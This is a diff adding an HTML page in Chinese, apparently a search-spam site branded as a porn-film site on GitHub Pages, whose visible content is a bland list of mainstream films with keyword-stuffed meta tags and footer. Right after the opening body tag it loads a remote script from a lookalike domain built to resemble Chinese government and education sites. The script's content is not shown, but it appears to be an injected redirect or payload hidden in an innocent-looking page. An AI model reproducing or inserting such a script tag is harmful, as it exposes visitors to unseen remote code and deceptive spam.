@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>色情电影网 - 高清电影在线观看 | seqingdianyingwang</title>
+    <meta name="description" content="色情电影网(https://seqingdianyingwang-top.github.io)提供最新高清电影、电视剧、动漫在线观看。尽在色情电影网，体验极致视听盛宴。">
+    <meta name="keywords" content="色情电影网, seqingdianyingwang, 电影, 在线观看, 高清电影, seqingdianyingwang-top.github.io">
+    <meta name="author" content="色情电影网">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <style>
+        /* 基础重置与变量 */
+        :root {
+            --primary: #66fcf1;
+            --secondary: #45a29e;
+            --dark-bg: #0b0c10;
+            --card-bg: rgba(31, 40, 51, 0.65);
+            --text-main: #c5c6c7;
+            --text-light: #ffffff;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif; 
+            background-color: var(--dark-bg); 
+            color: var(--text-main); 
+            line-height: 1.6; 
+            overflow-x: hidden; 
+        }
+        
+        /* 动态背景光晕动画 */
+        .bg-animation {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
+            background: linear-gradient(135deg, #0b0c10 0%, #1f2833 100%);
+            overflow: hidden;
+        }
+        .bg-animation::before, .bg-animation::after {
+            content: ''; position: absolute; border-radius: 50%; filter: blur(100px); opacity: 0.4;
+            animation: float 25s infinite ease-in-out;
+        }
+        .bg-animation::before {
+            width: 500px; height: 500px; background: var(--primary); top: -150px; left: -150px;
+        }
+        .bg-animation::after {
+            width: 400px; height: 400px; background: #9b59b6; bottom: -100px; right: -100px; animation-delay: -12s;
+        }
+        @keyframes float {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            33% { transform: translate(150px, 100px) scale(1.1); }
+            66% { transform: translate(50px, 200px) scale(0.9); }
+        }
+
+        /* 玻璃拟物化通用类 */
+        .glass {
+            background: var(--card-bg);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(102, 252, 241, 0.15);
+            border-radius: 16px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+        }
+
+        /* 头部导航 */
+        header {
+            position: fixed; top: 0; width: 100%; z-index: 1000;
+            padding: 15px 5%; display: flex; justify-content: space-between; align-items: center;
+            background: rgba(11, 12, 16, 0.85); backdrop-filter: blur(15px);
+            border-bottom: 1px solid rgba(102, 252, 241, 0.1);
+        }
+        .logo { font-size: 1.6rem; font-weight: 800; color: var(--primary); text-decoration: none; letter-spacing: 1px; }
+        nav ul { list-style: none; display: flex; gap: 30px; }
+        nav a { 
+            color: var(--text-main); text-decoration: none; font-size: 1rem; 
+            font-weight: 500; transition: all 0.3s ease; position: relative; 
+        }
+        nav a::after {
+            content: ''; position: absolute; width: 0; height: 2px; bottom: -5px; left: 0;
+            background: var(--primary); transition: width 0.3s;
+        }
+        nav a:hover { color: var(--primary); }
+        nav a:hover::after { width: 100%; }
+        .menu-toggle { display: none; color: var(--primary); font-size: 1.8rem; cursor: pointer; }
+
+        /* 主体布局 */
+        main { padding-top: 90px; padding-bottom: 40px; }
+        section { padding: 70px 5%; }
+
+        /* Hero 首屏区 */
+        .hero { text-align: center; padding: 120px 5% 100px; position: relative; }
+        .hero h1 { 
+            font-size: 3.5rem; color: var(--text-light); margin-bottom: 25px; 
+            text-shadow: 0 0 20px rgba(102, 252, 241, 0.5); font-weight: 900; letter-spacing: 2px;
+        }
+        .hero p { font-size: 1.25rem; max-width: 650px; margin: 0 auto 40px; color: #a0a0a0; }
+        .btn {
+            display: inline-block; padding: 14px 40px; background: linear-gradient(45deg, var(--primary), var(--secondary));
+            color: #000; text-decoration: none; border-radius: 30px; font-weight: bold; font-size: 1.1rem;
+            transition: all 0.4s ease; box-shadow: 0 5px 15px rgba(102, 252, 241, 0.3);
+        }
+        .btn:hover { transform: translateY(-5px) scale(1.05); box-shadow: 0 10px 25px rgba(102, 252, 241, 0.5); }
+
+        /* 栏目标题通用样式 */
+        .section-title { 
+            font-size: 2.2rem; color: var(--text-light); margin-bottom: 50px; text-align: center; 
+            font-weight: 700; text-transform: uppercase; letter-spacing: 2px;
+        }
+        .section-title span { color: var(--primary); }
+
+        /* 栏目一：电影分类 (CSS Grid 悬浮卡片) */
+        .categories-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 30px; }
+        .cat-card { padding: 40px 20px; text-align: center; transition: all 0.4s ease; cursor: pointer; }
+        .cat-card:hover { transform: translateY(-15px); border-color: var(--primary); background: rgba(102, 252, 241, 0.1); }
+        .cat-icon { font-size: 3rem; margin-bottom: 20px; display: block; }
+        .cat-card h3 { color: var(--text-light); font-size: 1.4rem; margin-bottom: 10px; }
+        .cat-card p { font-size: 0.95rem; opacity: 0.8; }
+
+        /* 栏目二：热门排行 (霓虹列表) */
+        .ranking-list { max-width: 800px; margin: 0 auto; }
+        .rank-item {
+            display: flex; align-items: center; padding: 20px; margin-bottom: 20px;
+            transition: all 0.3s ease; border-left: 4px solid transparent;
+        }
+        .rank-item:hover { background: rgba(102, 252, 241, 0.08); border-left: 4px solid var(--primary); transform: scale(1.02); }
+        .rank-num { font-size: 2rem; font-weight: 900; color: rgba(102, 252, 241, 0.3); margin-right: 25px; width: 50px; text-align: center; transition: color 0.3s; }
+        .rank-item:hover .rank-num { color: var(--primary); text-shadow: 0 0 10px var(--primary); }
+        .rank-info h3 { color: var(--text-light); margin-bottom: 8px; font-size: 1.3rem; }
+        .rank-info p { font-size: 0.95rem; color: #888; }
+
+        /* 栏目三：最新更新 (横向平滑滚动) */
+        .latest-scroll { display: flex; overflow-x: auto; gap: 25px; padding: 20px 10px 40px; scroll-snap-type: x mandatory; }
+        .latest-scroll::-webkit-scrollbar { height: 10px; }
+        .latest-scroll::-webkit-scrollbar-track { background: rgba(255,255,255,0.05); border-radius: 5px; }
+        .latest-scroll::-webkit-scrollbar-thumb { background: var(--secondary); border-radius: 5px; }
+        .movie-card { flex: 0 0 280px; scroll-snap-align: start; padding: 25px; transition: transform 0.3s; }
+        .movie-card:hover { transform: translateY(-10px); }
+        .poster-placeholder { 
+            height: 180px; border-radius: 12px; margin-bottom: 20px; 
+            display: flex; align-items: center; justify-content: center; font-size: 3rem; color: rgba(255,255,255,0.3);
+        }
+        .movie-card h3 { color: var(--text-light); font-size: 1.2rem; margin-bottom: 8px; }
+        .movie-card span { font-size: 0.85rem; color: var(--primary); background: rgba(102, 252, 241, 0.1); padding: 4px 10px; border-radius: 20px; }
+
+        /* 栏目四：关于我们 (居中聚焦) */
+        .about-content { max-width: 800px; margin: 0 auto; text-align: center; padding: 50px; }
+        .about-content p { margin-bottom: 25px; font-size: 1.15rem; line-height: 1.8; }
+        .url-display { 
+            background: rgba(0,0,0,0.6); padding: 20px; border-radius: 12px; 
+            font-family: 'Courier New', monospace; color: var(--primary); margin: 30px 0;
+            display: inline-block; font-size: 1.2rem; border: 1px dashed var(--secondary);
+            word-break: break-all;
+        }
+        .about-content a { color: var(--primary); text-decoration: none; border-bottom: 1px dotted var(--primary); }
+
+        /* 页脚 */
+        footer { text-align: center; padding: 40px 20px; border-top: 1px solid rgba(102, 252, 241, 0.1); margin-top: 60px; }
+        footer p { color: #666; font-size: 0.95rem; margin-bottom: 10px; }
+        .footer-logo { color: var(--primary); font-weight: bold; font-size: 1.2rem; margin-bottom: 15px; display: block; }
+
+        /* 移动端深度适配 */
+        @media (max-width: 768px) {
+            .menu-toggle { display: block; }
+            nav ul {
+                display: none; flex-direction: column; position: absolute;
+                top: 70px; left: 0; width: 100%; background: rgba(11, 12, 16, 0.98);
+                padding: 25px 0; text-align: center; border-bottom: 1px solid rgba(102, 252, 241, 0.2);
+            }
+            nav ul.active { display: flex; }
+            nav ul li { margin: 15px 0; }
+            .hero h1 { font-size: 2.2rem; }
+            .hero p { font-size: 1rem; }
+            .section-title { font-size: 1.8rem; }
+            .rank-item { flex-direction: column; text-align: center; }
+            .rank-num { margin-right: 0; margin-bottom: 15px; font-size: 1.5rem; }
+            .about-content { padding: 30px 20px; }
+            .url-display { font-size: 0.9rem; padding: 15px; }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+    <!-- 动态背景 -->
+    <div class="bg-animation"></div>
+    
+    <!-- 顶部导航 -->
+    <header>
+        <a href="#" class="logo">色情电影网</a>
+        <div class="menu-toggle" onclick="toggleMenu()">☰</div>
+        <nav>
+            <ul id="nav-list">
+                <li><a href="#">首 页</a></li>
+                <li><a href="#">电影分类</a></li>
+                <li><a href="#">热门排行</a></li>
+                <li><a href="#">最新更新</a></li>
+                <li><a href="#">关于我们</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <!-- 首页推荐区 -->
+        <section class="hero">
+            <h1>色情电影网</h1>
+            <p>探索无限影视乐趣，尽在色情电影网。为您提供高清、流畅的在线观影体验，打造专属您的私人影院。</p>
+            <a href="#" class="btn">立即探索</a>
+        </section>
+
+        <!-- 栏目一：电影分类 -->
+        <section id="categories">
+            <h2 class="section-title">电影<span>分类</span></h2>
+            <div class="categories-grid">
+                <div class="glass cat-card">
+                    <span class="cat-icon">🎬</span>
+                    <h3>动作科幻</h3>
+                    <p>震撼视效与未来科技</p>
+                </div>
+                <div class="glass cat-card">
+                    <span class="cat-icon">🕵️</span>
+                    <h3>悬疑惊悚</h3>
+                    <p>烧脑剧情与心跳加速</p>
+                </div>
+                <div class="glass cat-card">
+                    <span class="cat-icon">❤️</span>
+                    <h3>浪漫爱情</h3>
+                    <p>甜蜜瞬间与感人故事</p>
+                </div>
+                <div class="glass cat-card">
+                    <span class="cat-icon">😂</span>
+                    <h3>喜剧搞笑</h3>
+                    <p>欢乐不断与解压首选</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目二：热门排行 -->
+        <section id="ranking">
+            <h2 class="section-title">热门<span>排行</span></h2>
+            <div class="ranking-list">
+                <div class="glass rank-item">
+                    <div class="rank-num">01</div>
+                    <div class="rank-info">
+                        <h3>沙丘2：绝命远征</h3>
+                        <p>科幻巨制，视听盛宴，年度必看大作。</p>
+                    </div>
+                </div>
+                <div class="glass rank-item">
+                    <div class="rank-num">02</div>
+                    <div class="rank-info">
+                        <h3>奥本海默</h3>
+                        <p>诺兰执导，奥斯卡获奖历史传记影片。</p>
+                    </div>
+                </div>
+                <div class="glass rank-item">
+                    <div class="rank-num">03</div>
+                    <div class="rank-info">
+                        <h3>坠落的审判</h3>
+                        <p>金棕榈奖最佳影片，悬疑与人性的碰撞。</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目三：最新更新 -->
+        <section id="latest">
+            <h2 class="section-title">最新<span>更新</span></h2>
+            <div class="latest-scroll">
+                <div class="glass movie-card">
+                    <div class="poster-placeholder" style="background: linear-gradient(45deg, #ff6b6b, #feca57);">🎞️</div>
+                    <h3>美国内战</h3>
+                    <span>2024-04-20 更新</span>
+                </div>
+                <div class="glass movie-card">
+                    <div class="poster-placeholder" style="background: linear-gradient(45deg, #48dbfb, #0abde3);">🦖</div>
+                    <h3>哥斯拉大战金刚2</h3>
+                    <span>2024-04-15 更新</span>
+                </div>
+                <div class="glass movie-card">
+                    <div class="poster-placeholder" style="background: linear-gradient(45deg, #1dd1a1, #10ac84);">🐼</div>
+                    <h3>功夫熊猫4</h3>
+                    <span>2024-04-10 更新</span>
+                </div>
+                <div class="glass movie-card">
+                    <div class="poster-placeholder" style="background: linear-gradient(45deg, #5f27cd, #341f97);">👻</div>
+                    <h3>超能敢死队</h3>
+                    <span>2024-04-05 更新</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目四：关于我们 -->
+        <section id="about">
+            <h2 class="section-title">关于<span>我们</span></h2>
+            <div class="glass about-content">
+                <p>欢迎访问 <strong>色情电影网</strong>，我们致力于为广大影迷提供最优质的在线观影导航服务。在这里，您可以轻松发现最新、最热的影视资源。</p>
+                <p>本站官方访问网址：</p>
+                <div class="url-display">https://seqingdianyingwang-top.github.io</div>
+                <p>请牢记我们的网址，收藏本站，随时畅享高清影视内容。本站所有资源均收集于互联网，仅供测试交流使用。</p>
+            </div>
+        </section>
+    </main>
+
+    <!-- 页脚 -->
+    <footer>
+        <span class="footer-logo">色情电影网</span>
+        <p>&copy; 2024 色情电影网 - 您的专属影视导航平台</p>
+        <p>网站名称：色情电影网 | 核心关键词：色情电影网, seqingdianyingwang, seqingdianyingwang-top.github.io</p>
+        <p>网址：https://seqingdianyingwang-top.github.io</p>
+    </footer>
+
+    <script>
+        // 移动端菜单切换
+        function toggleMenu() {
+            var navList = document.getElementById('nav-list');
+            navList.classList.toggle('active');
+        }
+
+        // 平滑滚动与导航高亮（可选增强）
+        document.querySelectorAll('nav a').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                if(this.getAttribute('href') === '#') {
+                    e.preventDefault();
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                }
+            });
+        });
+    </script>
+</body>
+</html>
